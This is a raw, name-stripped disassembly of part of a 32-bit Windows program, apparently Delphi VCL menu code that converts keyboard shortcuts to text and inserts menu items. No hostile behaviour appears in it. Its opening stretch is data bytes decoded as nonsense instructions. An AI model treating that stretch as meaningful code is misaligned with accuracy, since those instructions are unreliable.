jne r-xdata
insd
popad
jae r-xdata
jo r-xdata
mov esp 0x58004010
add [ eax ] al
[ eax ]
add bh bh
adc [ ebx + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
dec esp
imul eax [ eax + eax + 0x50 ] 0x73
adc [ eax ] al
cmp [ eax ] eax
add bh bh
adc [ eax ] al
cmp eax 0x40ff0000
jno r-xdata
dec ecx
outsb
js r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
xchg esp eax
or cl [ edi + 0x6e ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
xor [ ebx + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov esp 0x9000446b
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x146d6574
inc edx
mov al [ 0xfffffffff000446a ]
jb r-xdata
inc ecx
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
push [ eax ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
cwde
add [ eax ] al
inc ebx
jne r-xdata
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x2c656c62
inc edx
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
push [ eax + 0x4473 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070014 ] al
outsb
inc ebx
insb
inc esp
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
inc ecx
add [ eax ] ch
int3
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
outsd
dec ecx
je r-xdata
sub cl cl
inc ecx
add [ eax ] ah
leave
inc ecx
add [ eax - 0x34 ] cl
inc ecx
add al ah
jge r-xdata
jb r-xdata
cmp [ edx ] 0x44
add [ eax + 0x443a ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
insd
movsb [ edi ] [ esi ]
xor eax [ eax + eax - 0x68 ]
add [ eax ] al
[ eax + 0x1ff0000 ]
xor eax [ eax ]
jl r-xdata
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
inc ecx
add [ eax ] ah
add bh bh
test al 0x6b
inc esp
add [ eax + 0x73 ] dh
insd
adc al 0x42
inc esp
cmp al [ eax + eax - 0x20 ]
push esp
inc ecx
add [ ebx ] al
add [ 0x756e654d ] al
add [ esi + eax * 4 + 0x7ed00044 ] cl
inc esp
inc esp
add [ eax ] bl
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
inc ecx
add [ eax - 0x63ffbfcd ] ch
add [ edx - 0x59ffbbc6 ] dl
cmp al [ eax + eax + 0x58 ]
add [ eax ] al
add ah ah
push ebx
je r-xdata
mov eax 0x34004436
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
je r-xdata
add [ eax + 0x34004436 ] bh
leave
inc ecx
add [ eax ] dl
0x41
lea eax [ eax ]
inc esp
cmp al [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4fffbbc6 ] al
cmp al [ eax + eax ]
insd
add [ eax ] al
add eax [ eax ]
std
add [ esi + eax * 4 - 0x78bfffbc ] ah
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ esi + edi * 2 + 0x44 ] bh
add [ eax + 0x30004171 ] ah
enter 0x41 0xbc
jo r-xdata
xor eax [ eax ]
pushfd
jae r-xdata
insd
sbb al 0x34
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
sbb cl cl
insd
jae r-xdata
add al dl
jle r-xdata
inc eax
add [ eax ] bh
cmp eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jae r-xdata
add eax [ eax ]
add eax 0x756e654d
add [ esi + eax * 4 + 0xe0044 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov esp 0x3c004010
add [ eax ] al
add [ ebx ] al
add ch bh
inc ecx
add [ eax ] dl
0x41
xchg [ eax + eax + 0x18 ] eax
leave
inc esp
add [ eax ] ah
add [ eax ] al
clc
cmp [ eax + eax + 0x28 ] eax
int3
sub_443dd4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
xor al cl
inc ecx
add [ eax + esi * 2 - 0x795bffbf ] bh
inc esp
add [ eax - 0x79 ] al
inc esp
add [ eax ] bl
leave
inc ecx
add [ eax ] dl
0x41
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3e ] ah
inc esp
add [ eax ] bh
add [ eax ] al
clc
cmp [ eax + eax + 0x28 ] eax
int3
sub_444178
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_433984
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4391d4
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_4441d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_444208
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403e9c
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_40410c
sub_44425c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_444445
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f34
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404084
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f34
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f34
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404084
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404084
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403e9c
mov eax esi
call sub_403e9c
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f34
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407ea0
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041a8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_444208
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404164
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f34
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404164
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404164
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404164
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44444c
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ec0
retn
sub_444460
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_40415c
push eax
mov eax edi
call sub_40415c
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40415c
push eax
mov eax edi
call sub_40435c
push eax
mov eax [ esi ]
call sub_40435c
pop edx
pop ecx
call sub_407d80
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_40415c
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4043fc
sub_4444bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40434c
xor eax eax
push ebp
push sub_444597
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_444460
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_444460
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_444460
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_444460
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44459e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44425c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407d30
test eax eax
jne r-xdata
sub_4445d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_446b74
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_446b84
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_444634
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_446b74
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_446b74
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_446b84
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_446b84
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4445d4
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_4445d4
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_446b84
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_446b84
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_444780
push ebx
mov ebx eax
mov eax ebx
call sub_441328
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_449690
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4447b8
push ebx
mov ebx eax
mov eax ebx
call sub_44133c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4447e8
push ebx
mov ebx eax
mov eax ebx
call sub_441350
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444818
push ebx
mov ebx eax
mov eax ebx
call sub_441378
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444848
push ebx
mov ebx eax
mov eax ebx
call sub_4413a0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4042a8
je r-xdata
mov al 0x1
pop ebx
retn
sub_44487c
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_441364
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_4448b8
push ebx
mov ebx eax
mov eax ebx
call sub_4413b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4448ec
push ebx
mov ebx eax
mov eax ebx
call sub_4413c8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444920
push ebx
mov ebx eax
mov eax ebx
call sub_4413dc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444954
push ebx
mov ebx eax
mov eax ebx
call sub_41cda8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44497c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44499c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4469dc
sub_4449bc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_446a4c
sub_4449dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_446aa0
sub_4449fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_444a18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403ef0
sub_444a3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_446bcc
sub_444a5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_446ba8
sub_444a7c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_446bbc
sub_444a9c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_444ac8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41c4b8
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_4445b4
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4474d8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_444b44
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_449474
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_446b74
test eax eax
jg r-xdata
mov edx esi
call sub_446f0c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_446b84
call sub_403164
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403164
lea eax [ esi + 0x44 ]
call sub_40cd4c
lea eax [ esi + 0x78 ]
call sub_40cd4c
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_444f60
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_416fec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c504
test bl bl
jle r-xdata
call sub_403164
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_444bf8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_444e53
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444e5a
lea eax [ ebp - 0x40 ]
call sub_403e9c
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403f34
mov eax ebx
call sub_446b74
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_445108
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042a8
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_446b74
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_447130
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_44425c
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_40421c
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40435c
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_40435c
push eax
mov eax ebx
call sub_445108
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_44674c
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042a8
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_40435c
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_446b74
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_445108
mov [ ebp - 0x25 ] eax
sub_444e73
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_444bf8
xor eax eax
pop ebp
retn
sub_444e98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44876c
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_447734
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_447c30
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_444634
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_444f08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_444f52
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41b5e8
mov eax [ ebp - 0x4 ]
call sub_4444bc
mov edx eax
mov eax ebx
call sub_446ba8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444f59
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_444f60
push ebx
mov ebx eax
test edx edx
je r-xdata
